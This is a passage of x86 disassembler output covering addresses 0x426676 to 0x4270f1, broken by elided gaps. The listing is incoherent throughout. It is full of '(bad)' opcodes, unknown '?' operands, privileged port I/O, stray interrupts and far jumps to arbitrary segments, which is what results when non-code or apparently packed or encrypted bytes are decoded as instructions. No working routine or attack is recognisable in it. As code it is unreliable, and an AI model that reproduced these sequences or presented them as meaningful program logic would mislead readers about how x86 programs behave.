  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x26b46da4]
  426682:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  426684:	mov    ch,0x9a
  426686:	add    DWORD PTR [eax],eax
  426688:	add    eax,0xb8000001
  42668d:	loopne 0x4266b7
  42668f:	lahf   
  426690:	adc    DWORD PTR [ebx],eax
  426692:	imul   ebx,DWORD PTR [edi-0xe7f2809],0x76
  426699:	es retf 0xae48
  42669d:	fmul   QWORD PTR ds:0xa0717af2
  4266a3:	push   ds
  4266a4:	sti    
  4266a5:	(bad)  
  4266a6:	sahf   
  4266a7:	mov    eax,0x761d46a4
  4266ac:	push   0x7bf0a646
  4266b1:	mov    ds:0xb40eaf36,eax
  4266b6:	pop    es
  4266b7:	bnd jl 0x42663d
  4266ba:	lea    esi,[ecx-0x67570fa2]
  4266c0:	clc    
  4266c1:	mov    BYTE PTR [ebp-0x61],dl
  4266c4:	jae    0x4266c9
  4266c6:	mov    esi,0xcabddb35
  4266cb:	push   ebx
  4266cc:	adc    DWORD PTR [eax+0x361f9443],ecx
  4266d2:	fisubr WORD PTR [ebp+0xc]
  4266d5:	fucomp st(0)
  4266d7:	push   ebp
  4266d8:	fidivr WORD PTR [edi]
  4266da:	pop    es
  4266db:	and    BYTE PTR [edi+edx*2],ch
  4266de:	std    
  4266df:	loopne 0x4266bb
  4266e1:	sbb    eax,0xf7c31e9f
  4266e6:	cli    
  4266e7:	mov    al,0x98
  4266e9:	mov    ebp,ecx
  4266eb:	pop    edx
  4266ec:	(bad)  
  4266ef:	add    al,0x57
  4266f1:	fs inc ebx
  4266f3:	ins    DWORD PTR es:[edi],dx
  4266f4:	or     DWORD PTR [esi+0x55b445ac],0x44
  4266fb:	test   DWORD PTR [esi+0x7dc63ce9],edx
  426701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426702:	addr16 pop edx
  426704:	ja     0x42671d
  426706:	xor    al,0x44
  426708:	in     eax,0xd3
  42670a:	push   cs
  42670b:	arpl   di,sp
  42670d:	lahf   
  42670e:	aad    0xb0
  426710:	out    0xd,eax
  426712:	int3   
  426713:	sub    dl,BYTE PTR [ecx-0x43]
  426716:	adc    DWORD PTR [esi],ecx
  426718:	push   eax
  426719:	inc    esi
  42671a:	imul   ecx,DWORD PTR [ebx+0x7e],0x46
  42671e:	and    eax,0x1febb51b
  426723:	int    0xff
  426725:	lods   al,BYTE PTR ds:[esi]
  426726:	(bad)  
  426728:	jae    0x426704
  42672a:	ds and al,0x43
  42672d:	and    eax,edi
  42672f:	add    cl,bh
  426731:	or     DWORD PTR [ebx+0x4e1db71b],esp
  426737:	or     bl,dl
  426739:	cmp    DWORD PTR [eax],edi
  42673b:	add    eax,0x1807c1b
  426740:	or     esi,DWORD PTR [esi+0x14548eac]
  426746:	cmp    al,0x80
  426748:	fsub   DWORD PTR [edi]
  42674a:	nop
  42674b:	in     eax,0x69
  42674d:	sbb    ecx,DWORD PTR [ebp+0xa]
  426750:	in     eax,dx
  426751:	push   ss
  426752:	pop    ds
  426753:	mov    ds:0x4f75bcdd,al
  426758:	or     ch,BYTE PTR [ecx]
  42675a:	xor    esi,DWORD PTR [edx+0x1d]
  42675d:	fdivr  st(4),st
  42675f:	jbe    0x42678a
  426761:	push   ecx
  426762:	retf   0xaa43
  426765:	mov    cl,bl
  426767:	xchg   esi,ecx
  426769:	retf   
  42676a:	xor    BYTE PTR [edx*8-0x65cfb0ea],0x63
  426772:	mov    ebx,0x2245dd53
  426777:	adc    edx,esi
  426779:	aam    0xc5
  42677b:	and    edi,DWORD PTR [ebp+0x33]
  42677e:	arpl   WORD PTR [ebx-0x1b2ac947],ax
  426784:	sub    bh,BYTE PTR [eax*2-0x79b9f3fb]
  42678b:	mov    WORD PTR ds:0xd54579a,fs
	...
  4267f1:	add    BYTE PTR [eax],al
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	ins    DWORD PTR es:[edi],dx
  426801:	inc    edx
  426802:	ja     0x426847
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    dh,bl
  42680d:	xchg   ecx,eax
  42680e:	or     ah,BYTE PTR [ebx-0x5375d843]
  426814:	xor    BYTE PTR [edx+0x28],ah
  426817:	mov    cs,ebx
  426819:	in     al,dx
  42681a:	push   0xe92467ef
  42681f:	xchg   esp,eax
  426820:	cwde   
  426821:	gs pushf 
  426823:	and    al,0xd8
  426825:	es fdiv st(4),st
  426828:	jmp    0x4267f5
  42682a:	cli    
  42682b:	and    bh,BYTE PTR [edi+0x79272d2e]
  426831:	test   DWORD PTR [ebp+0x6e032494],eax
  426837:	fisub  WORD PTR [esi+0x1ac6f7e4]
  42683d:	pushw  0x8159
  426841:	jno    0x4267d6
  426843:	dec    esi
  426844:	lea    ecx,[eax+0x63461b3e]
  42684a:	fisttp WORD PTR [ecx+0x3c69b229]
  426850:	mov    ds:0xc68b905,eax
  426855:	nop
  426856:	rcl    edi,1
  426858:	pop    ebx
  426859:	data16 jae 0x426890
  42685c:	fs pop esi
  42685e:	dec    eax
  42685f:	test   DWORD PTR [ebx-0x43],ecx
  426862:	xor    ebp,DWORD PTR [esi-0x2dfdbe73]
  426868:	stc    
  426869:	ffree  st(0)
  42686b:	sahf   
  42686c:	daa    
  42686d:	pop    edx
  42686e:	lods   eax,DWORD PTR ds:[esi]
  42686f:	sub    DWORD PTR [esi-0x6dcfe35a],edi
  426875:	les    edx,FWORD PTR gs:[ebx+0x6c]
  426879:	jae    0x42685c
  42687b:	cmp    edx,ebp
  42687d:	jg     0x42688c
  42687f:	adc    esi,DWORD PTR [edi-0x63]
  426882:	(bad)  
  426883:	imul   edx,DWORD PTR [ecx-0x5a9e2763],0x6b7c03f8
  42688d:	jno    0x426907
  42688f:	fmul   QWORD PTR [ebx+0x530fe0e2]
  426895:	cmp    eax,0x64b2afd
  42689a:	sbb    al,0xe9
  42689c:	das    
  42689d:	sbb    al,0xce
  42689f:	out    dx,eax
  4268a0:	into   
  4268a1:	test   al,0x4e
  4268a3:	nop
  4268a4:	and    BYTE PTR [ebp-0x44],dl
  4268a7:	out    dx,al
  4268a8:	icebp  
  4268a9:	push   es
  4268aa:	shl    bl,1
  4268ac:	arpl   sp,sp
  4268ae:	test   eax,0xd7bf8ac2
  4268b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268b4:	iret   
  4268b5:	fwait
  4268b6:	loopne 0x4268c0
  4268b8:	lods   eax,DWORD PTR ds:[esi]
  4268b9:	cmp    edi,DWORD PTR [ebp+0x5089308b]
  4268bf:	test   cl,bl
  4268c1:	xchg   ebp,eax
  4268c2:	fisttp QWORD PTR es:[ebx-0x69b2890]
  4268c9:	lea    esp,[ebx]
  4268cb:	mov    ebx,0x8dfaced2
  4268d0:	xlat   BYTE PTR ds:[ebx]
  4268d1:	and    DWORD PTR [edi-0x3c],eax
  4268d4:	pop    ecx
  4268d5:	pusha  
  4268d6:	scas   eax,DWORD PTR es:[edi]
  4268d7:	stc    
  4268d8:	mov    DWORD PTR [eax+0x30],esi
  4268db:	iret   
  4268dc:	adc    BYTE PTR [ecx-0xdff6c25],cl
  4268e2:	push   esp
  4268e3:	adc    cl,BYTE PTR [esi+0x76]
  4268e6:	iret   
  4268e7:	addr16 xchg ebp,eax
  4268e9:	mov    DWORD PTR [eax+0x80c866d],ecx
  4268ef:	xor    edi,DWORD PTR [edx]
  4268f1:	xor    eax,0x875b162d
  4268f6:	add    DWORD PTR [edx],ebx
  4268f8:	imul   ebx,DWORD PTR [edi+0x67],0x67bbf343
  4268ff:	bound  ebp,QWORD PTR [esp+ebx*4+0x4af31b0f]
  426906:	jl     0x426896
  426908:	arpl   WORD PTR [edx],sp
  42690a:	sbb    eax,0x321a8be6
  42690f:	scas   al,BYTE PTR es:[edi]
  426910:	ins    BYTE PTR es:[edi],dx
	...
  426971:	add    BYTE PTR [eax],al
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    edx,DWORD PTR [ebx+ebx*4-0x72]
  426983:	jmp    0x440647
  426988:	add    eax,0xef000001
  42698d:	nop
  42698e:	inc    edi
  42698f:	ficom  DWORD PTR [edi-0x11ea5f45]
  426995:	mov    bl,0xe1
  426997:	cli    
  426998:	xor    edx,esp
  42699a:	pop    es
  42699b:	ja     0x4269e2
  42699d:	jp     0x42693c
  42699f:	mov    eax,DWORD PTR [ebx+0x7cd5fbb5]
  4269a5:	push   esi
  4269a6:	imul   DWORD PTR [edi-0x3d]
  4269a9:	jo     0x4269a2
  4269ab:	jno    0x426948
  4269ad:	mov    DWORD PTR [edi],edi
  4269af:	and    al,0x10
  4269b1:	push   ss
  4269b2:	mov    eax,0xb415c671
  4269b7:	call   ebx
  4269b9:	cli    
  4269ba:	dec    ebx
  4269bb:	sbb    eax,DWORD PTR [eax-0x1b1be852]
  4269c1:	stos   BYTE PTR es:[edi],al
  4269c2:	test   al,0xec
  4269c4:	pop    eax
  4269c5:	xor    eax,DWORD PTR ds:0x3e25554d
  4269cb:	stos   DWORD PTR es:[edi],eax
  4269cc:	dec    eax
  4269cd:	sahf   
  4269ce:	cmp    DWORD PTR [edi],ecx
  4269d0:	jp     0x426978
  4269d2:	push   ss
  4269d3:	mov    dl,0xd0
  4269d5:	sub    al,dl
  4269d7:	or     BYTE PTR [esi+ecx*1],bh
  4269da:	jno    0x4269d8
  4269dc:	repz mov al,ds:0xcab30c7a
  4269e2:	jge    0x4269bb
  4269e4:	jno    0x4269af
  4269e6:	mov    WORD PTR [eax],ss
  4269e8:	xor    esp,ebp
  4269ea:	cli    
  4269eb:	shl    BYTE PTR [esi],1
  4269ed:	jp     0x4269e9
  4269ef:	mov    eax,0xdd3258e7
  4269f4:	pushf  
  4269f5:	jae    0x426a1e
  4269f7:	adc    edi,DWORD PTR [esi-0x470b9a31]
  4269fd:	mov    dh,0xa6
  4269ff:	(bad)  
  426a00:	lods   eax,DWORD PTR ds:[esi]
  426a01:	(bad)  
  426a03:	loopne 0x426a07
  426a05:	sbb    dl,dh
  426a07:	dec    edi
  426a08:	or     bh,ch
  426a0a:	iret   
  426a0b:	fwait
  426a0c:	cld    
  426a0d:	je     0x426a0e
  426a0f:	push   0xcfe0707c
  426a14:	out    dx,al
  426a15:	in     eax,dx
  426a16:	cmp    DWORD PTR [ecx-0x5a],esp
  426a19:	retf   0xcd93
  426a1c:	pop    edi
  426a1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a1e:	(bad)  
  426a1f:	enter  0xcf4f,0xf8
  426a23:	lods   eax,DWORD PTR ds:[esi]
  426a24:	ins    BYTE PTR es:[edi],dx
  426a25:	sbb    edx,esi
  426a27:	ins    DWORD PTR es:[edi],dx
  426a28:	push   es
  426a29:	or     ah,BYTE PTR [esi+esi*4+0x179e0904]
  426a30:	(bad)  
  426a31:	and    BYTE PTR [ecx],cl
  426a33:	xor    DWORD PTR [esi-0x6eb822a9],0xfa256bda
  426a3d:	cld    
  426a3e:	test   BYTE PTR [eax],bh
  426a40:	test   al,0xef
  426a42:	inc    esi
  426a43:	jge    0x4269d2
  426a45:	xchg   ebx,eax
  426a46:	jmp    0x426a23
  426a48:	call   0x7e8ebd46
  426a4d:	and    ch,0xef
  426a50:	inc    edi
  426a51:	jg     0x426a06
  426a53:	pop    es
  426a54:	bound  edx,QWORD PTR [esi-0x10]
  426a57:	data16 stc 
  426a59:	mov    bl,0xd0
  426a5b:	xchg   DWORD PTR [edi],edx
  426a5d:	jmp    0x79a6:0xe2bb5a83
  426a64:	jle    0x426a8f
  426a66:	es mov edi,es
  426a69:	sahf   
  426a6a:	pop    ebx
  426a6b:	aad    0xc3
  426a6d:	xor    al,0x3d
  426a6f:	and    DWORD PTR [eax-0x7912b3dc],ebp
  426a75:	xor    cl,bh
  426a77:	dec    edi
  426a78:	mov    ebx,ecx
  426a7a:	retf   0xd3c9
  426a7d:	push   0xffffffe6
  426a7f:	push   ecx
  426a80:	push   ss
  426a81:	mov    dl,0x42
  426a83:	outs   dx,BYTE PTR ds:[esi]
  426a84:	mov    esp,0x74162d57
  426a89:	inc    edi
  426a8a:	in     eax,0xee
  426a8c:	ss pop ebp
  426a8e:	aas    
  426a8f:	inc    ebp
  426a90:	sbb    BYTE PTR [eax],al
	...
  426af2:	add    BYTE PTR [eax],al
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x70
  426b01:	pop    ds
  426b02:	retf   
  426b03:	adc    al,0xc4
  426b05:	popf   
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    eax,0x98000001
  426b0d:	push   esp
  426b0e:	sub    bl,BYTE PTR [edx+ebp*4]
  426b11:	or     esi,DWORD PTR [ebp-0x37bd696]
  426b17:	mov    eax,ds:0x56f557e7
  426b1c:	ds aam 0xb3
  426b1f:	mov    esi,0xe39f804e
  426b24:	mov    cl,0x63
  426b26:	mov    eax,0xa347f186
  426b2b:	adc    eax,DWORD PTR [ebx-0x3f09e501]
  426b31:	jbe    0x426b7a
  426b33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b34:	jo     0x426bb0
  426b36:	int3   
  426b37:	mov    ds:0x94ccb83f,al
  426b3c:	and    edx,DWORD PTR [ecx]
  426b3e:	mov    ah,0xa6
  426b40:	mov    ah,0xde
  426b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b43:	cmp    bl,BYTE PTR [edi-0x4bfea07e]
  426b49:	je     0x426ba6
  426b4b:	inc    ecx
  426b4c:	and    edx,DWORD PTR [ebx]
  426b4e:	mov    edx,0x24371f2c
  426b53:	push   ss
  426b54:	test   al,0x72
  426b56:	pop    ebx
  426b57:	ror    DWORD PTR [ebx],0x85
  426b5a:	sub    bl,BYTE PTR [ecx-0x677b9b7a]
  426b60:	adc    dh,BYTE PTR [ebx-0x7c9eb691]
  426b66:	cmc    
  426b67:	ret    
  426b68:	cmp    ch,BYTE PTR [edx]
  426b6a:	or     BYTE PTR [ecx+0x46122f7e],bh
  426b70:	stos   BYTE PTR es:[edi],al
  426b71:	or     BYTE PTR [ebx+0x16],ch
  426b74:	push   ebx
  426b75:	pushf  
  426b76:	add    eax,0x385d755
  426b7b:	and    DWORD PTR [edi],ebx
  426b7d:	and    edx,DWORD PTR [edi]
  426b7f:	mov    ecx,0xf52c98cc
  426b84:	sbb    al,0xd6
  426b86:	cmp    eax,0xb01e4d40
  426b8b:	(bad)  
  426b8c:	scas   al,BYTE PTR es:[edi]
  426b8d:	push   esi
  426b8e:	push   ebp
  426b8f:	sub    bh,cl
  426b91:	sub    al,0x10
  426b93:	into   
  426b94:	jecxz  0x426be4
  426b96:	push   edi
  426b97:	dec    edi
  426b98:	pop    ebp
  426b99:	mov    bl,0xd4
  426b9b:	ds or  eax,0xc4b956e6
  426ba1:	mov    ecx,0x3429fcc
  426ba6:	popf   
  426ba7:	push   0xffffffe0
  426ba9:	push   cs
  426baa:	lock adc BYTE PTR [ebx],ch
  426bad:	adc    eax,edx
  426baf:	loop   0x426bd9
  426bb1:	add    al,0x83
  426bb3:	iret   
  426bb4:	imul   esi,eax,0xae40d2d8
  426bba:	mov    edi,0xe2d7f91a
  426bbf:	fadd   QWORD PTR [eax+0x2d]
  426bc2:	es dec edi
  426bc4:	and    al,0xe6
  426bc6:	daa    
  426bc7:	sub    esp,ecx
  426bc9:	adc    ebp,ebx
  426bcb:	xchg   BYTE PTR [edx+edx*2-0x1a415709],bl
  426bd2:	rol    edi,0xc9
  426bd5:	xchg   esp,eax
  426bd6:	pusha  
  426bd7:	js     0x426bfb
  426bd9:	add    eax,0xef63407f
  426bde:	mov    ds:0x21efbe83,eax
  426be3:	inc    ecx
  426be4:	xchg   esp,eax
  426be5:	jp     0x426c0b
  426be7:	xchg   esp,eax
  426be8:	retf   
  426be9:	test   eax,0xea9376ef
  426bee:	fisubr DWORD PTR [eax]
  426bf0:	pop    edi
  426bf1:	dec    ecx
  426bf2:	lds    esi,FWORD PTR [edi+0x269a8553]
  426bf8:	xchg   edi,eax
  426bf9:	cmp    DWORD PTR [edx+ecx*8+0x15cf76bb],eax
  426c00:	sti    
  426c01:	sar    BYTE PTR ds:0xcfe6cfe0,0x2e
  426c08:	sub    BYTE PTR [edi],ah
  426c0a:	push   cs
  426c0b:	jecxz  0x426c3e
  426c0d:	cwde   
  426c0e:	inc    ebx
  426c0f:	add    DWORD PTR [edi+0x0],ebp
	...
  426c71:	add    BYTE PTR [eax],al
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xe82ecdf5
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0x20000001
  426c8d:	xchg   ebp,eax
  426c8e:	popf   
  426c8f:	push   0x10f074a
  426c94:	pop    esi
  426c95:	fild   QWORD PTR [ebx+0x7447b5bb]
  426c9b:	add    al,0xd3
  426c9d:	ja     0x426c89
  426c9f:	sub    esp,DWORD PTR [esi+eiz*4+0x3ddaa8ad]
  426ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ca7:	jae    0x426c37
  426ca9:	xchg   edx,eax
  426caa:	jle    0x426cad
  426cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cad:	mov    edx,esp
  426caf:	fldcw  WORD PTR [ecx-0x66]
  426cb2:	xchg   ebx,eax
  426cb3:	add    al,0x23
  426cb5:	lea    ecx,[edi+eiz*8]
  426cb8:	sub    BYTE PTR [edx+0x5e],al
  426cbb:	pop    esi
  426cbc:	jo     0x426c90
  426cbe:	jle    0x426d0a
  426cc0:	mov    ecx,0xe770c097
  426cc5:	push   ebx
  426cc6:	cmc    
  426cc7:	xlat   BYTE PTR ds:[ebx]
  426cc8:	push   edi
  426cc9:	ja     0x426d1c
  426ccb:	cmp    al,0xbc
  426ccd:	cmp    bh,BYTE PTR [ebp+esi*1+0x2d1e48cd]
  426cd4:	neg    cl
  426cd6:	lods   al,BYTE PTR ds:[esi]
  426cd7:	inc    esi
  426cd8:	cmp    eax,0x10625f3c
  426cdd:	mov    al,ds:0x99b51037
  426ce2:	mov    cl,0x84
  426ce4:	xor    ecx,DWORD PTR ds:0x9011a14a
  426cea:	cmp    esp,DWORD PTR [eax]
  426cec:	jnp    0x426c9e
  426cee:	sbb    DWORD PTR [esi-0x5829b630],eax
  426cf4:	mov    ds:0x91777eb,al
  426cf9:	dec    ebx
  426cfa:	push   0xffc7ce7f
  426cff:	sti    
  426d00:	pop    ecx
  426d01:	(bad)  
  426d03:	mov    ds,WORD PTR [eax+0x695e3d31]
  426d09:	in     al,0x50
  426d0b:	mov    bl,dl
  426d0d:	adc    al,0x54
  426d0f:	sbb    al,BYTE PTR [edi]
  426d11:	and    al,0x8b
  426d13:	aam    0x70
  426d15:	rol    ecx,1
  426d17:	call   0x9911:0x72c791ce
  426d1e:	sti    
  426d1f:	mov    ah,BYTE PTR [ecx]
  426d21:	push   esp
  426d22:	(bad)  
  426d23:	xor    al,0x81
  426d25:	jg     0x426d44
  426d27:	sbb    DWORD PTR [ebx+0x3d],0xc58d4566
  426d2e:	imul   ebp,esp,0x86bd0d78
  426d34:	push   ebp
  426d35:	repz adc DWORD PTR [edx+ebp*2-0x1e301f2f],0x73
  426d3e:	adc    dh,BYTE PTR [ebx+0x6]
  426d41:	and    al,0x13
  426d43:	and    dh,BYTE PTR [eax-0x7cd52b6b]
  426d49:	out    dx,al
  426d4a:	arpl   WORD PTR [ebp+0x48],ax
  426d4d:	xchg   esi,eax
  426d4e:	(bad)  
  426d4f:	jmp    0x426ce2
  426d51:	fcmovnu st,st(0)
  426d53:	fs jnp 0x426cd7
  426d56:	xor    cl,dl
  426d58:	out    0x96,al
  426d5a:	sahf   
  426d5b:	shr    BYTE PTR [ebx+0x5cd6d0ef],1
  426d61:	aam    0xda
  426d63:	push   edx
  426d64:	mov    al,0x83
  426d66:	(bad)  
  426d68:	adc    edi,DWORD PTR ds:0x36df6e1
  426d6e:	jmp    0x426de2
  426d70:	(bad)
  426d73:	pop    ds
  426d74:	add    eax,0xc0a2a6a9
  426d79:	mov    al,0x92
  426d7b:	(bad)  
  426d7c:	stc    
  426d7d:	fcomip st,st(1)
  426d7f:	ret    0x762b
  426d82:	jns    0x426dd7
  426d84:	jnp    0x426d4d
  426d86:	mov    ch,0x48
  426d88:	mov    ds:0x44d06840,eax
  426d8d:	shr    BYTE PTR [edi+0x11],0x48
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0xf10c:0xc7c2ecf9
  426e01:	pop    edi
  426e02:	pop    eax
  426e03:	push   0x19fce
  426e08:	add    eax,0x67000001
  426e0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e0e:	shl    ebx,1
  426e10:	jae    0x426df2
  426e12:	push   ds
  426e13:	pusha  
  426e14:	es xchg edx,eax
  426e16:	sub    eax,0x9442974e
  426e1b:	sub    cl,dh
  426e1d:	out    0x7,al
  426e1f:	sub    DWORD PTR [edx-0x4f],ebp
  426e22:	scas   eax,DWORD PTR es:[edi]
  426e23:	push   eax
  426e24:	push   edx
  426e25:	jmp    0x6a:0x7cf45a3e
  426e2c:	push   ebp
  426e2d:	fwait
  426e2e:	or     DWORD PTR [edx+0x57058d78],esi
  426e34:	xor    BYTE PTR [ecx],bh
  426e36:	inc    ebx
  426e37:	jl     0x426e78
  426e39:	retf   
  426e3a:	inc    esi
  426e3b:	add    eax,0xca535cda
  426e40:	nop
  426e41:	nop
  426e42:	adc    DWORD PTR [eax-0x4],ecx
  426e45:	mov    esi,0x2499fdb3
  426e4a:	rol    dl,cl
  426e4c:	push   ebx
  426e4d:	dec    DWORD PTR [ebx+0x45]
  426e50:	mov    DWORD PTR [ecx],ebx
  426e52:	xor    BYTE PTR [esi-0x3a],cl
  426e55:	fidiv  DWORD PTR [edi-0x39]
  426e58:	mov    edi,0x4c38cb0b
  426e5d:	ins    BYTE PTR es:[edi],dx
  426e5e:	mov    esp,0xbdcda4ed
  426e63:	pop    ss
  426e64:	pop    edi
  426e65:	(bad)  
  426e66:	sub    al,0xc
  426e68:	neg    DWORD PTR [ebx+0x748fe0]
  426e6e:	mov    edi,0x85159cad
  426e73:	rcr    DWORD PTR [edx-0x17dd96cc],1
  426e79:	mov    bl,0x4e
  426e7b:	inc    ebp
  426e7c:	jmp    0x426eb8
  426e7e:	sub    dh,BYTE PTR [eax+0x69]
  426e81:	push   esi
  426e82:	push   esp
  426e83:	push   es
  426e84:	xchg   DWORD PTR [edi+ecx*2+0x12474d4a],esp
  426e8b:	jp     0x426e1a
  426e8d:	div    DWORD PTR [edx+0x4f070a69]
  426e93:	in     al,0xdf
  426e95:	mov    ch,0x73
  426e97:	outs   dx,DWORD PTR ds:[esi]
  426e98:	dec    ebp
  426e99:	clc    
  426e9a:	ja     0x426ee0
  426e9c:	(bad)  
  426e9e:	xor    eax,DWORD PTR [ebx]
  426ea0:	cmove  esi,DWORD PTR ds:0x59f34ab6
  426ea7:	mov    eax,DWORD PTR [eax+0x3d]
  426eaa:	in     eax,0x4b
  426eac:	mov    dh,0x7b
  426eae:	xor    ch,cl
  426eb0:	add    BYTE PTR [edx+edx*1],bl
  426eb3:	adc    ebx,DWORD PTR [edi]
  426eb5:	ja     0x426e77
  426eb7:	aaa    
  426eb8:	sbb    ebp,DWORD PTR [edx-0x693ceb40]
  426ebe:	and    eax,0x14a6e027
  426ec3:	push   ecx
  426ec4:	jnp    0x426f30
  426ec6:	neg    BYTE PTR [edx+0x51]
  426ec9:	stos   DWORD PTR es:[edi],eax
  426eca:	jne    0x426e73
  426ecc:	stos   BYTE PTR es:[edi],al
  426ecd:	gs out dx,al
  426ecf:	add    ebx,ebp
  426ed1:	div    BYTE PTR [ecx-0x6ee5875d]
  426ed7:	push   ds
  426ed8:	in     eax,dx
  426ed9:	div    BYTE PTR [edx-0x6d]
  426edc:	adc    dl,ah
  426ede:	jp     0x426e8b
  426ee0:	mov    ds:0x2ea9f5ab,al
  426ee5:	mov    ds:0x5a7cdf2d,al
  426eea:	dec    ecx
  426eeb:	jo     0x426ea9
  426eed:	ins    BYTE PTR es:[edi],dx
  426eee:	sbb    eax,0xe3c08999
  426ef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ef4:	test   eax,0x110c7c81
  426ef9:	lock repz pop DWORD PTR [esi+0x20]
  426efe:	mov    al,0x95
  426f00:	shl    DWORD PTR [ebp-0x688979bb],1
  426f06:	test   DWORD PTR [ebx+0x26],edx
  426f09:	data16 mov al,ds:0xb275481b
  426f0f:	ins    DWORD PTR es:[edi],dx
  426f10:	add    BYTE PTR [eax],0x0
	...
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [esi+edi*1-0x2c67cef0],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	mov    es,WORD PTR [ecx-0x73]
  426f8f:	mov    ah,0xb
  426f91:	inc    ebp
  426f92:	loopne 0x426fc3
  426f94:	cmp    bh,BYTE PTR [esi-0x3d]
  426f97:	cmc    
  426f98:	mov    ?,WORD PTR [esi*1-0x7267c28e]
  426f9f:	jp     0x426fc2
  426fa1:	xchg   esp,eax
  426fa2:	sub    esp,ecx
  426fa4:	call   0xa56a:0x7f94da85
  426fab:	adc    bh,BYTE PTR [ebx+0x6f]
  426fae:	inc    edx
  426faf:	imul   DWORD PTR [ecx+0xe134347]
  426fb5:	ror    dl,1
  426fb7:	mov    bh,0x8e
  426fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fba:	mov    ss,WORD PTR [edi-0x4d]
  426fbd:	aaa    
  426fbe:	test   al,0x27
  426fc0:	repnz call 0x705b:0x51bc069e
  426fc8:	int3   
  426fc9:	pop    ss
  426fca:	pop    ss
  426fcb:	xchg   edx,eax
  426fcc:	sbb    DWORD PTR ds:0xcc88a0db,ecx
  426fd2:	pop    ebx
  426fd3:	sbb    eax,DWORD PTR [ebp-0x4f]
  426fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fd7:	xor    BYTE PTR [edi-0x7e],cl
  426fda:	pop    esi
  426fdb:	out    0x83,eax
  426fdd:	in     eax,dx
  426fde:	neg    BYTE PTR [ebx-0x7f]
  426fe1:	or     al,0x11
  426fe3:	pop    ecx
  426fe4:	imul   esp,DWORD PTR [ecx],0x24b8ec49
  426fea:	fyl2x  
  426fec:	inc    esi
  426fed:	inc    esi
  426fee:	xchg   ecx,eax
  426fef:	cmp    eax,0x565e4fb9
  426ff4:	mov    ?,WORD PTR [ebx]
  426ff6:	in     al,dx
  426ff7:	ds or  al,0xc7
  426ffa:	jmp    0x1487545c
  426fff:	inc    ebp
  427000:	push   0x16
  427002:	mov    ch,0x4c
  427004:	xlat   BYTE PTR ds:[ebx]
  427005:	xlat   BYTE PTR ds:[ebx]
  427006:	hlt    
  427007:	(bad)  
  427008:	outs   dx,BYTE PTR ds:[esi]
  427009:	arpl   WORD PTR [edx+0x57c673e8],ax
  42700f:	or     eax,0x7be52216
  427014:	mov    cl,0x94
  427016:	mov    al,ds:0xefb591e
  42701b:	xchg   edx,eax
  42701c:	loope  0x42709a
  42701e:	imul   edx,eax,0xffffffc9
  427021:	test   eax,0x73b42773
  427026:	add    al,0x64
  427028:	mov    eax,ds:0x1cb46429
  42702d:	inc    esp
  42702e:	push   cs
  42702f:	jnp    0x426fde
  427031:	and    BYTE PTR [ebx+esi*4],ch
  427034:	out    dx,eax
  427035:	outs   dx,BYTE PTR ds:[esi]
  427036:	pop    ebx
  427037:	mov    ecx,0x46acffc9
  42703c:	cs es popf 
  42703f:	ds jle 0x42709d
  427042:	push   ebx
  427043:	sub    al,0xec
  427045:	xor    al,0x6f
  427047:	mov    BYTE PTR [edi],bh
  427049:	mov    dl,0x84
  42704b:	into   
  42704c:	test   DWORD PTR [ebp+0x11],ebp
  42704f:	out    dx,eax
  427050:	jp     0x42702a
  427052:	adc    DWORD PTR [edx+0x717c2901],0x39014e3f
  42705c:	mov    ebp,0x9d7db1ef
  427061:	inc    edx
  427062:	adc    edx,DWORD PTR [ebp+0x4b]
  427065:	call   DWORD PTR [esi]
  427067:	or     dl,BYTE PTR [edi-0x25]
  42706a:	nop
  42706b:	jb     0x427064
  42706d:	out    0xc5,al
  42706f:	sar    DWORD PTR [eax+0x6cad4032],0x76
  427076:	fnstsw WORD PTR [edi]
  427078:	add    al,0xbc
  42707a:	inc    esi
  42707b:	aad    0xdb
  42707d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42707e:	nop
  42707f:	inc    ecx
  427080:	add    BYTE PTR [edx],al
  427082:	fnstenv [ebx-0x4f3a3d5e]
  427088:	mov    es,WORD PTR [ecx+ecx*1+0x48763713]
  42708f:	add    BYTE PTR [esi],bh
	...
  4270f1:	add    BYTE PTR [eax],al
